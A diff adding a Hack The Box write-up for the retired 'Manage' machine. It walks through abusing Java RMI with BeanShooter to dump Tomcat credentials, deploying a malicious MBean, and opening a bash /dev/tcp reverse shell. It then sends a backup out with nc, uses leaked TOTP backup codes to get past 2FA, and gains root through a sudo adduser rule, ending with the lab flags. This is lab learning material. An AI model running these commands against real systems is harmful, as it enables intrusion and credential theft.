@@ -1,0 +1,222 @@
+# HTB: Manage
+- Date Completed: August 13, 2025
+- Difficulty: Easy (Retired)
+- Methodology: BeanShooter -> Credential Harvesting / Reverse Shell -> Harvesting Backup Codes -> Pivoting to privileged user -> Creating a more privileged user -> sudo -i for root.
+
+#RECON
+
+Tcp Scan:
+
+kali@kali:~/HTB/Machines/m4n4g3$ sudo nmap -sS --top-ports 1000 10.129.255.213                      
+
+PORT     STATE SERVICE
+22/tcp   open  ssh
+2222/tcp open  EtherNetIP-1
+8080/tcp open  http-proxy
+
+BeanShooter enum:
+
+kali@kali:~/HTB/Machines/m4n4g3/beanshooter-4.1.0$ java -jar target/beanshooter-4.1.0-jar-with-dependencies.jar enum 10.129.255.213 2222   
+
+[+] Enumerating tomcat users:
+[+]
+[+]     - Listing 2 tomcat users:
+[+]
+[+]             ----------------------------------------
+[+]             Username:  manager
+[+]             Password:  fhErvo2r9wuTEYiYgt
+[+]             Roles:
+[+]                        Users:type=Role,rolename="manage-gui",database=UserDatabase
+[+]
+[+]             ----------------------------------------
+[+]             Username:  admin
+[+]             Password:  onyRPCkaG4iX72BrRtKgbszd
+[+]             Roles:
+[+]                        Users:type=Role,rolename="role1",database=UserDatabase
+
+#FOOTHOLD
+
+Deploying stager:
+
+kali@kali:~/HTB/Machines/m4n4g3/beanshooter-4.1.0$ java -jar target/beanshooter-4.1.0-jar-with-dependencies.jar stager 10.10.14.247 8000 tonka                                                            
+[+] Creating HTTP server on: 10.10.14.247:8000
+[+] Creating MLetHandler for endpoint: /
+[+] Creating JarHandler for endpoint: /4f7975b58b8a4dc4b7718277ddf4998c
+[+] Waiting for incoming connections...
+[+] 
+[+] Press Enter to stop listening.
+
+Deploying deploy:
+
+kali@kali:~/HTB/Machines/m4n4g3/beanshooter-4.1.0$ java -jar target/beanshooter-4.1.0-jar-with-dependencies.jar \                                                                                         
+  tonka deploy 10.129.146.114 2222 \                                                                 
+  --stager-url http://10.10.14.247:8000/ \                                                           
+  --no-stager                                                                                        
+[+] Starting MBean deployment.
+[+]
+[+]     Deplyoing MBean: TonkaBean
+[+]
+[+]             MBean class is not known by the server.
+[+]             Starting MBean deployment.
+[+]
+[+]                     Deplyoing MBean: MLet
+[+]                     MBean with object name DefaultDomain:type=MLet was successfully deployed.
+[+]
+[+]             Loading MBean from http://10.10.14.247:8000/
+[+]
+[+]     MBean with object name MLetTonkaBean:name=TonkaBean,id=1 was successfully deployed.
+
+Receiving connection on stager:
+
+[+] Incoming request from: 10.129.146.114
+[+] Requested resource: /
+[+] Sending mlet:
+[+]
+[+]     Class:     de.qtc.beanshooter.tonkabean.TonkaBean
+[+]     Archive:   4f7975b58b8a4dc4b7718277ddf4998c
+[+]     Object:    MLetTonkaBean:name=TonkaBean,id=1
+[+]     Codebase:  http://10.10.14.247:8000
+[+]
+[+] Incoming request from: 10.129.146.114
+[+] Requested resource: /4f7975b58b8a4dc4b7718277ddf4998c
+[+] Sending jar file with md5sum: 86a677f387200178b7bee14a9ea9d487
+
+Initiating a reverse shell:
+
+kali@kali:~/HTB/Machines/m4n4g3/beanshooter-4.1.0$ java -jar target/beanshooter-4.1.0-jar-with-dependencies.jar \                                                                                         
+  tonka exec 10.129.146.114 2222 \                                                                   
+  "bash -c 'bash -i >& /dev/tcp/10.10.14.247/4444 0>&1'"                                             
+[+] Invoking the executeCommand method with arguments: [bash, -c, bash -i >& /dev/tcp/10.10.14.247/4444 0>&1]
+
+Receiving the connection:
+
+kali@kali:~/HTB/Machines/m4n4g3/beanshooter-4.1.0$ nc -nvlp 4444                                     
+listening on [any] 4444 ...
+connect to [10.10.14.247] from (UNKNOWN) [10.129.146.114] 45904
+bash: cannot set terminal process group (1019): Inappropriate ioctl for device
+bash: no job control in this shell
+tomcat@manage:/$
+
+User.txt:
+
+cat /opt/tomcat/user.txt
+a86d44c7243b65a9171cf7da3e0bc279
+
+#PRIVESC
+
+From tomcat to useradmin:
+
+Downloading backup.tar.gz:
+
+tomcat@manage:/home/useradmin/backups$ nc 10.10.14.247 9001 < backup.tar.gz
+nc 10.10.14.247 9001 < backup.tar.gz
+
+Unzipping:
+
+kali@kali:~/HTB/Machines/m4n4g3/backup$ tar -xzf backup.tar.gz
+
+Contents:
+
+kali@kali:~/HTB/Machines/m4n4g3/backup$ ls -lsa                                                      
+total 36
+4 drwxr-xr-x 4 kali kali 4096 Jun 21  2024 .
+4 drwxrwxr-x 5 kali kali 4096 Aug 13 17:25 ..
+4 -rw-rw-r-- 1 kali kali 3088 Aug 13 17:22 backup.tar.gz
+0 lrwxrwxrwx 1 kali kali    9 Jun 21  2024 .bash_history -> /dev/null
+4 -rw-r--r-- 1 kali kali  220 Jun 21  2024 .bash_logout
+4 -rw-r--r-- 1 kali kali 3771 Jun 21  2024 .bashrc
+4 drwx------ 2 kali kali 4096 Jun 21  2024 .cache
+4 -r-------- 1 kali kali  200 Jun 21  2024 .google_authenticator
+4 -rw-r--r-- 1 kali kali  807 Jun 21  2024 .profile
+4 drwxrwxr-x 2 kali kali 4096 Jun 21  2024 .ssh
+
+Obtaining 2FA backup codes:
+
+kali@kali:~/HTB/Machines/m4n4g3/backup$ cat .google_authenticator                                    
+CLSSSMHYGLENX5HAIFBQ6L35UM
+" RATE_LIMIT 3 30 1718988529
+" WINDOW_SIZE 3
+" DISALLOW_REUSE 57299617
+" TOTP_AUTH
+99852083
+20312647
+73235136
+92971994
+86175591
+98991823
+54032641
+69267218
+76839253
+56800775
+
+Used backup codes to bypass useradmin's 2FA:
+
+tomcat@manage:/home/useradmin/backups$ su useradmin
+su useradmin
+Password: onyRPCkaG4iX72BrRtKgbszd
+Verification code: 20312647
+
+useradmin to root:
+
+Checking privileges:
+
+sudo -l
+
+User useradmin may run the following commands on manage:
+    (ALL : ALL) NOPASSWD: /usr/sbin/adduser ^[a-zA-Z0-9]+$
+
+No admin group existed, but /etc/sudoers granted %admin full sudo rights.
+
+Created privileged account:
+
+sudo /usr/sbin/adduser admin
+Adding user `admin' ...
+Adding new group `admin' (1003) ...
+Adding new user `admin' (1003) with group `admin' ...
+Creating home directory `/home/admin' ...
+Copying files from `/etc/skel' ...
+New password: test
+Retype new password: test
+passwd: password updated successfully
+Changing the user information for admin
+Enter the new value, or press ENTER for the default
+        Full Name []: tester
+        Room Number []: 369
+        Work Phone []: 1234567890
+        Home Phone []: 0987654321
+        Other []: 
+
+Is the information correct? [Y/n] y
+
+Switching to new privileged user:
+
+su admin
+Password: test
+
+Checking privileges:
+
+admin@manage:/home/useradmin/backups$ sudo -l
+
+User admin may run the following commands on manage:
+    (ALL) ALL
+
+#PWN3D
+
+admin@manage:/home/useradmin/backups$ sudo -i
+
+root@manage:~#
+
+Root.txt:
+
+root@manage:~# cat /root/root.txt
+
+b3645b7e6db6d5276ad33f0c75b8dc34
+
+#FLAGS
+
+user.txt : a86d44c7243b65a9171cf7da3e0bc279
+root.txt : b3645b7e6db6d5276ad33f0c75b8dc34
+
+#SUMMARY
+
+Exploint the Java-RMI service running on port 2222, by using BeanShooter to enumerate users and credentials, and also to achieve RCE by spawning a reverse shell. Finding the backup.tar.gz containing 2FA codes, logged in as a more privileged user: useradmin. useradmin's privileges allowed sudo while adding user. By creating a user named admin, it was created with elevated privileges granting sudo ALL. Running sudo -i as admin provided root permissions.                                     
